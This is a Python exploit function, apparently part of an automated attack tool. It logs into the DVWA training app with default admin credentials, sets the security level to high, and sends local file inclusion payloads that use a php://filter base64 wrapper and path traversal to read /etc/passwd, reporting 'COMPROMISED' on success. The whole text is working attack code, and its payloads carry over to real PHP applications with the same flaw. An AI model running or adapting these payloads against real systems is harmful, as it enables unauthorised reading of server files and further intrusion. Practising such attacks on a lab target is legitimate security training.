def run_exploit(target_url):
    """
    Ouroboros Payload 2: LFI PHP Wrapper Bypass (HIGH Level Bypass)
    Targeting HIGH level DVWA that strips 'http' and 'https'.
    Using 'php://filter' to base64 encode the output and bypass naive filters.
    """
    import requests, re, base64
    session = requests.Session()
    
    def extract_token(html):
        m = re.search(r"name=['\"]user_token['\"].*?value=['\"]([a-f0-9]{32})['\"]", html, re.I)
        return m.group(1) if m else None
        
    try:
        tok = extract_token(session.get(f"{target_url}/setup.php", timeout=5).text)
        if tok: session.post(f"{target_url}/setup.php", data={"create_db": "Create / Reset Database", "user_token": tok})
        tok2 = extract_token(session.get(f"{target_url}/login.php").text)
        session.post(f"{target_url}/login.php", data={"username": "admin", "password": "password", "Login": "Login", "user_token": tok2})
        tok3 = extract_token(session.get(f"{target_url}/security.php").text)
        session.post(f"{target_url}/security.php", data={"security": "high", "seclev_submit": "Submit", "user_token": tok3})
        
        # Payload LFI via PHP Filter
        payload = "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd"
        
        r = session.get(f"{target_url}/vulnerabilities/fi/", params={"page": payload})
        
        # Regex to find base64 string that decodes to 'root:x:0:0'
        # root:x:0:0 in base64 is 'cm9vdDp4OjA6MD'
        if "cm9vdDp4OjA6MD" in r.text or "root:x:0:0" in r.text:
            return {"status": "COMPROMISED", "details": "LFI PHP Filter Base64 Bypass berhasil."}
            
        # Kadang DVWA Level High mensyaratkan nama file tidak boleh mengandung path traversal
        # Coba payload alternatif untuk High: nama file lokal
        payload2 = "file../../../../../../etc/passwd"
        r2 = session.get(f"{target_url}/vulnerabilities/fi/", params={"page": payload2})
        if "root:x:0:0" in r2.text:
            return {"status": "COMPROMISED", "details": "LFI High Level 'file' prefix bypass berhasil."}
            
        return {"status": "FAILED", "details": "Semua variasi LFI diblokir."}
    except Exception as e:
        return {"status": "FAILED", "details": str(e)}
